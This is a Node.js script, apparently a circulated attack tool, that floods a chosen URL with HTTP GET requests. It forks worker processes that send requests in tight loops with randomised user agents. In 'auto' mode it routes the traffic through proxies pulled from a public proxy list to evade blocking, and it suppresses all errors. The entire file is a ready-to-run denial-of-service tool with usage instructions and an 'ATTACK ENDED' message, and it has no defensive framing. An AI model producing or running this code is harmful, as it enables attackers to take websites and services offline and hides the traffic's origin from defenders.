const target = process.argv[2];
const time = process.argv[3]
const mode = process.argv[4];
const threads = process.argv[5];
const axios = require('axios');
const cluster = require('cluster')
const fakeua = require('fake-useragent');
const { setTimeout } = require('timers');
const request = require('request');

if (process.argv.length !== 6){
    console.log(`
╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗  ╔╗ ╦ ╦╔═╗╔═╗╔═╗╔═╗
╚═╗║ ║║  ╠╩╗║╣  ║   ╠╩╗╚╦╝╠═╝╠═╣╚═╗╚═╗
╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩   ╚═╝ ╩ ╩  ╩ ╩╚═╝╚═╝
                     SOCKET BYPASS V.5
Usage: ./atk <URL> <Time> <auto/off> <Threads>
  Example: ./atk <https://example.com> <60> <auto> <5>

            [ > CODE By: ZR : ZeRoDuck < ]
`),
    process.exit(0);
} else {
    console.log("FLOOD SOCKET V.6"),
    console.log("[ > CODE By: ZR : ZeRoDuck < ]"),
    main();
}

async function main() {

    console.log("RUNING MAIN")

    const proxyscrape = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
    const proxies = proxyscrape.data.replace(/\r/g, '').split('\n');

    function send_req_proxy() {

        let proxy = proxies[Math.floor(Math.random() * proxies.length)];
        let useragent = fakeua();
        request({
        url: target,
        method: "GET",
        proxy: "http://" + proxy,
        headers: {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': 1,
            'User-Agent': useragent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US',
        }
        },function (error, response, body) {
            if (response.statusCode == 200){
                console.log(response.statusCode + "_REQUEST_SEND");
            } else if (response.statusCode == 301 || response.statusCode == 302) {
                console.log(response.statusCode + "_PERMANENT_REDIRECT")
            } else if (response.statusCode == 404) {
                console.log(response.statusCode + "_NOT_FOUND");
            } else if (response.statusCode == 403) {
                console.log(response.statusCode + "_FORBIDDEN");
            } else if (response.statusCode == 500) {
                console.log(response.statusCode + "_INTERNAL_SERVER_ERROR");
            } else if (response.statusCode == 502) {
                console.log(response.statusCode + "_BAD_GATEWAY");
            } else if (response.statusCode == 503) {
                console.log(response.statusCode + "_SERVICE_UNAVAILABLE");
            } else if (response.statusCode == 504) {
                console.log(response.statusCode + "_GATEWAY_TIMEOUT")
            } else {
                console.log(response.statusCode + "_STATUS")
            }
        });

    };

    function send_req_raw() {

        let useragent = fakeua();
        request({
        url: target,
        method: "GET",
        headers: {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': 1,
            'User-Agent': useragent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US',
        }
        },function (error, response, body) {
            if (response.statusCode == 200){
                console.log(response.statusCode + "_REQUEST_SEND");
            } else if (response.statusCode == 301 || response.statusCode == 302) {
                console.log(response.statusCode + "_PERMANENT_REDIRECT")
            } else if (response.statusCode == 404) {
                console.log(response.statusCode + "_NOT_FOUND");
            } else if (response.statusCode == 403) {
                console.log(response.statusCode + "_FORBIDDEN");
            } else if (response.statusCode == 500) {
                console.log(response.statusCode + "_INTERNAL_SERVER_ERROR");
            } else if (response.statusCode == 502) {
                console.log(response.statusCode + "_BAD_GATEWAY");
            } else if (response.statusCode == 503) {
                console.log(response.statusCode + "_SERVICE_UNAVAILABLE");
            } else if (response.statusCode == 504) {
                console.log(response.statusCode + "_GATEWAY_TIMEOUT")
            } else {
                console.log(response.statusCode + "_STATUS")
            }
        });

    };

    function runable() {

        if (cluster.isMaster) {
            for (let i = 0; i < threads; i++) {
                cluster.fork();
            }
            cluster.on('exit', (worker, code, signal) => {
                console.log(`Threads: ${worker.process.pid} ended`);
            });
        } else {
            startloop();
            console.log(`Threads: ${process.pid} started`);
        }

        function startloop() {
            if (mode == "auto" || mode == "AUTO" || mode == "Auto"){
                console.log("MODE AUTO PROXY")
                setInterval(() => {
                    send_req_proxy();
                });
            } else {
                console.log("MODE RAW")
                setInterval(() => {
                    send_req_raw();
                });
            }
        }

    };

    setTimeout(() => {
        console.log("ATTACK ENDED"),
        process.exit(0);
    }, time * 1000);

    runable();

}

process.on('uncaughtException', function (err) {
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err);
});
